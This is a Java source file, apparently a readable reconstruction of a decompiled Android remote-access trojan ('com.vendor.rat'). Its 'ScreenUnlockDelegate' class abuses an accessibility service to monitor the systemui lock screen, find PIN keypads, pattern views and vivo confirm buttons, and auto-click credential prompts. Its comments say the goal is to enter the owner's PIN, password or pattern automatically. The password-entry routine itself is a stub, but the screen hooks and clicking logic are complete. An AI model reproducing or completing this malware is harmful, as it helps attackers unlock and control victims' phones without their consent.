package com.vendor.rat.auto.engine;

import android.os.Build;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.vendor.rat.auto.condition.CombineFilter;
import com.vendor.rat.auto.condition.StringCondition;
import com.vendor.rat.auto.entity.UiNode;
import com.vendor.rat.service.MyAccessibilityService;
import com.vendor.rat.utils.DeviceUtils;

import java.util.ArrayList;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.SynchronousQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicReference;

/**
 * 设备凭证解锁代理 (systemui 锁屏界面)
 *
 * Vendor: o/g0.java (432 行)
 * 功能: 监听 systemui 锁屏界面，自动输入 PIN/密码/图案解锁
 *       支持两种模式: VERIFY_MODE (验证) / ASSIST_MODE (辅助)
 *       支持 vivo 特殊确认按钮
 *
 * 字段对齐:
 *   f641n → threadPool (ThreadPoolExecutor)
 *   f642o → processedActions (ConcurrentLinkedQueue)
 *   f643p → assistStrategies (ConcurrentLinkedQueue)
 *   q     → verifyPackages (ConcurrentLinkedQueue)
 *   f644r → currentTarget (AtomicReference)
 *   f645s → currentMode (AtomicReference)
 */
public class ScreenUnlockDelegate extends AutoEngine {

    private static final String TAG = "UseDeviceCredentialDelegate";
    private static final String SYSTEM_UI = "com.android.systemui";

    // 模式常量 — ADAPT: r.c enum
    public static final String MODE_ASSIST = "ASSIST_MODE";
    public static final String MODE_VERIFY = "VERIFY_MODE";
    public static final String MODE_VERIFY_PAUSE = "VERIFY_PAUSE";

    // ADAPT: f641n → threadPool
    public final ThreadPoolExecutor threadPool;

    // ADAPT: f642o → processedActions
    public final ConcurrentLinkedQueue<String> processedActions;

    // ADAPT: f643p → assistStrategies
    public final ConcurrentLinkedQueue<Object> assistStrategies;

    // ADAPT: q → verifyPackages
    public final ConcurrentLinkedQueue<String> verifyPackages;

    // ADAPT: f644r → currentTarget
    public final AtomicReference<String> currentTarget;

    // ADAPT: f645s → currentMode
    public final AtomicReference<String> currentMode;

    public ScreenUnlockDelegate() {
        super(createListenWindows(), SYSTEM_UI);
        this.threadPool = new ThreadPoolExecutor(0, 5, 10L, TimeUnit.SECONDS, new SynchronousQueue<>());
        this.processedActions = new ConcurrentLinkedQueue<>();
        this.assistStrategies = new ConcurrentLinkedQueue<>();
        this.verifyPackages = new ConcurrentLinkedQueue<>();
        this.currentTarget = new AtomicReference<>(null);
        this.currentMode = new AtomicReference<>(MODE_ASSIST);
    }

    // ============ 静态窗口构建 ============

    /** ADAPT: T() → createListenWindows */
    public static List<WindowMatcher> createListenWindows() {
        List<WindowMatcher> list = new ArrayList<>();
        WindowMatcher w1 = new WindowMatcher(SYSTEM_UI,
                "com.android.settings.password.ConfirmDeviceCredentialActivity");
        w1.addEventType(32).addEventType(16384).addEventType(8).addEventType(2048).addEventType(16);
        list.add(w1);
        WindowMatcher w2 = new WindowMatcher(SYSTEM_UI);
        w2.addEventType(32).addEventType(16384).addEventType(8).addEventType(2048).addEventType(16);
        list.add(w2);
        return list;
    }

    // ============ 静态过滤器 ============

    /** ADAPT: H() → cancel 按钮 */
    public static CombineFilter createCancelFilter() {
        return CombineFilter.and(StringCondition.viewId(SYSTEM_UI + ":id/cancel"));
    }

    /** ADAPT: I() → negative 按钮 */
    public static CombineFilter createNegativeButtonFilter() {
        return CombineFilter.and(StringCondition.viewId(SYSTEM_UI + ":id/button_negative"));
    }

    /** ADAPT: J() → use_credential 按钮 */
    public static CombineFilter createUseCredentialFilter() {
        return CombineFilter.and(StringCondition.viewId(SYSTEM_UI + ":id/button_use_credential"));
    }

    /** ADAPT: L() → 键盘区域 */
    public static CombineFilter createKeypadFilter() {
        return CombineFilter.and(
                StringCondition.className("android.view.ViewGroup"),
                new StringCondition(StringCondition.Property.VIEW_ID,
                        SYSTEM_UI + ":id/key", StringCondition.MatchType.STARTS_WITH));
    }

    /** ADAPT: U() → 图案锁 */
    public static CombineFilter createLockPatternFilters() {
        return CombineFilter.or(
                CombineFilter.and(StringCondition.className("android.view.View"),
                        StringCondition.viewId(SYSTEM_UI + ":id/lockPattern")),
                CombineFilter.and(StringCondition.className("android.view.View"),
                        StringCondition.viewId(SYSTEM_UI + ":id/biometric_lockPattern")));
    }

    /** ADAPT: Y() → 数字键 */
    public static CombineFilter createNumKeyFilter() {
        return CombineFilter.and(
                StringCondition.className("android.widget.Button"),
                new StringCondition(StringCondition.Property.VIEW_ID,
                        SYSTEM_UI + ":id/num", StringCondition.MatchType.STARTS_WITH));
    }

    /** ADAPT: Z() → 四位以上密码键 */
    public static CombineFilter createFourToMoreKeyFilter() {
        return CombineFilter.and(
                StringCondition.className("android.widget.Button"),
                new StringCondition(StringCondition.Property.VIEW_ID,
                        SYSTEM_UI + ":id/four_to_more_key", StringCondition.MatchType.STARTS_WITH));
    }

    // ============ 实例方法 ============

    @Override
    public void execute() {
        // ADAPT: vendor 无独立 execute，由 onAccessibilityEvent 驱动
    }

    @Override
    public void onWindowMatched(String packageName, String className,
                                AccessibilityEvent event) {
        // ADAPT: 由 onAccessibilityEvent 状态机驱动
    }

    /** ADAPT: K() → waitForLeaveSystemUI */
    public boolean waitForLeaveSystemUI() {
        AtomicInteger retryCount = new AtomicInteger(0);
        boolean left = !Objects.equals(currentPackage, SYSTEM_UI);
        while (!left && retryCount.incrementAndGet() <= 20) {
            T0(1);
            left = !Objects.equals(currentPackage, SYSTEM_UI);
        }
        return left;
    }

    /** ADAPT: M() → clickVivoConfirmButton */
    public void clickVivoConfirmButton() {
        if (!DeviceUtils.isVivo()) return;
        UiNode root = k();
        if (root == null) return;
        String[] vivoIds = {
            SYSTEM_UI + ":id/mix_confirm",
            SYSTEM_UI + ":id/iv_complete",
            SYSTEM_UI + ":id/vivo_pin_confirm",
            SYSTEM_UI + ":id/mix_normal_confirm"
        };
        for (String id : vivoIds) {
            UiNode btn = root.findOneByCombine(StringCondition.viewId(id));
            if (btn != null && btn.click()) return;
        }
    }

    /** ADAPT: S() → isReady */
    public boolean isReady() {
        if (Objects.equals(currentMode.get(), MODE_VERIFY_PAUSE)) return false;
        if (Objects.equals(currentMode.get(), MODE_VERIFY)) return currentTarget.get() != null;
        return Objects.equals(currentMode.get(), MODE_ASSIST) && currentTarget.get() != null;
    }

    /** ADAPT: R() → getMode */
    public String getMode() {
        synchronized (ScreenUnlockDelegate.class) { return currentMode.get(); }
    }

    /** ADAPT: X(mode) → setMode */
    public void setMode(String mode) {
        synchronized (ScreenUnlockDelegate.class) { currentMode.set(mode); }
    }

    /** ADAPT: V(str, str2) → updateTarget */
    public void updateTarget(String packageName, String className) {
        if (Objects.equals(getMode(), MODE_VERIFY)) {
            if (!verifyPackages.isEmpty() && packageName != null
                    && verifyPackages.contains(packageName)) {
                currentTarget.set(packageName);
            }
        } else if (Objects.equals(getMode(), MODE_ASSIST)) {
            if (!assistStrategies.isEmpty() && packageName != null) {
                currentTarget.set(packageName);
            }
        }
    }

    // ============ 事件处理 ============

    /** ADAPT: u() → onAccessibilityEvent (部分反编译失败，基于 smali 推断) */
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event, String packageName,
                                     String className) {
        // ADAPT: vendor 检查 utils.g.p0() 屏幕状态
        if (!isReady()) return;
        super.onAccessibilityEvent(event, packageName, className);
        if (!isReady()) return;

        if (!matchesAny(createListenWindows())) return;

        UiNode root = k();
        if (root == null) return;

        // 查找 "使用凭证" / "取消" 按钮
        UiNode credentialBtn = root.findOneByCombine(
                CombineFilter.or(createUseCredentialFilter(), createNegativeButtonFilter()));
        if (credentialBtn != null) {
            credentialBtn.click();
            Log.d(TAG, "已点击密码验证引导按钮");
        } else {
            Log.d(TAG, "已进入用户设备密码验证窗口");
            // ADAPT: vendor 提交 f0 Runnable 到线程池
            threadPool.submit(() -> {
                // vendor P(ReqUnlockDeviceVO): 反编译失败, 骨架实现
                // 核心逻辑: 使用 ConfirmLockDelegate.K() 输入密码/图案
                Log.d(TAG, "解锁任务已提交");
            });
        }
    }

    // ============ 生命周期 ============

    @Override
    public void destroy() {
        try {
            threadPool.shutdownNow();
            processedActions.clear();
            assistStrategies.clear();
            verifyPackages.clear();
            currentTarget.set(null);
            super.destroy();
        } catch (Exception e) {
            Log.e(TAG, "destroy error", e);
        }
    }

    @Override
    public boolean equals(Object obj) { return obj instanceof ScreenUnlockDelegate; }

    @Override
    public int hashCode() { return Objects.hash(ScreenUnlockDelegate.class.getName()); }
}
